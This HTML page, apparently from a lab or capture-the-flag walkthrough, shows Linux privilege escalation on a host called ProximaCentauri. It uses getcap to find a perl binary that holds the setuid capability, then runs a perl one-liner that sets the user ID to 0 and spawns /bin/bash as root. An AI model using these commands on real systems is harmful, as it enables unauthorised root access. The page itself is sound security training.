<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>5.1 Scan the file system for files with capabilities</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">5.1 Scan the file system for files with capabilities</h1><br/><br />1. Start scanning the file system for files with capabilities using <code>getcap -r /</code>   The -r flag tells getcap to search recursively, ‘/‘ to indicate that we want to search the whole system.<br />    The  output is usually filled with tens or hundreds of  “Operation not  supported” errors, making it hard to read. We can redirect errors to  /dev/null to get a cleaner output. More info <a href="https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/">here</a>.<br />    On your SSH connection run the following command.<br />    <div class="codebox"><div class="codebox">proxima@ProximaCentauri<span style="color:#a52a2a;font-weight:700">:</span>~<span style="color:#6a5acd;font-weight:400">$getcap</span>&nbsp;-r&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>&nbsp;2&gt;<span style="color:#a52a2a;font-weight:700">/</span>dev<span style="color:#a52a2a;font-weight:700">/</span>null</div></div><br /><br />	<span style="color:#ffa500;">Output:</span><br />    <img src="images/691-1.png" alt="images/691-1.png" /><br />    <br />    There is a copy of the binary perl which has a capability of setuid.<br /><br />2. Visit <a href="https://gtfobins.github.io/gtfobins/perl/#capabilities">https://gtfobins.github.io/gtfobins/perl/#capabilities</a> and you'll find the “perl” capabilities.<br />    <img src="images/691-2.png" alt="images/691-2.png" /><br />   <br />3. Execute the vulnerable binary to escalate the current user privilege.<br />    <div class="codebox"><div class="codebox">proxima@ProximaCentauri<span style="color:#a52a2a;font-weight:700">:</span>~$<span style="color:#a52a2a;font-weight:700">/</span>home<span style="color:#a52a2a;font-weight:700">/</span>proxima<span style="color:#a52a2a;font-weight:700">/</span>proximaCentauriA<span style="color:#a52a2a;font-weight:700">/perl</span>&nbsp;-e&nbsp;<span style="color:#ff00ff;font-weight:400">'use&nbsp;POSIX&nbsp;qw(setuid);&nbsp;POSIX::setuid(0);&nbsp;exec&nbsp;"/bin/bash";'</span><br /></div></div><br />   <br />	<span style="color:#ffa500;">Output:</span><br />    <img src="images/691-3.png" alt="images/691-3.png" /><br /><br />    Your are root.<br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>